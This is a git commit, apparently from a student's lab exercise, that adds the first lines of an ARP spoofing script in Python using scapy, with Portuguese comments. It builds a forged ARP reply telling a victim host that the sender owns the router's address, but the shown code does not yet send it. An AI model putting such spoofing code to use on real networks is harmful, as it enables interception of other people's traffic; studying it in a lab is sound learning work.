df8cb1165b0846e361625465308022a4ffe67496
Mariacmv <mariaclaragmviana@gmail.com>
2025-10-21 15:05:54 -0300

    Definindo um pacote ARP

---
+++ ARP_Spoofer/arp_spoof.py
@@ -0,0 +1,6 @@
+#Criando um ataque spoofing 
+
+import scapy.all as scapy
+
+#cria o pacote arp
+packet = scapy.ARP(op=2, pdst="10.0.2.7", hwpdst="08:00:27:08:af:07", psrc="10.0.2.1") #estou dizendo a vítima: eu tenho o endereço do roteador
